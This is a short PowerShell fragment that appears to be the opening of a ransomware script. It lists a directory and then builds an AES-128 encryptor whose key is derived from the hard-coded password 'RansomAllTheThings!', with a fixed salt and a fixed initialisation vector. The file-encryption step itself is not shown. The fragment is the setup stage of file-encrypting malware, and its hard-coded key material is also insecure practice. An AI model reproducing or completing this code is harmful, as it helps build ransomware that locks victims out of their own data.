dir;
$aes = new-object System.Security.Cryptography.AesCryptoServiceProvider;
$aes.KeySize = 128;
$aes.Mode = 4;
$aes_crypt = $aes.CreateEncryptor([System.Security.Cryptography.Rfc2898DeriveBytes]::new("RansomAllTheThings!",@([byte]1,2,3,4,5,6,7,8)).GetBytes(16), @([byte]16,15,14,13,12,11,10,9,8,7,6,5,4,3,2,1));
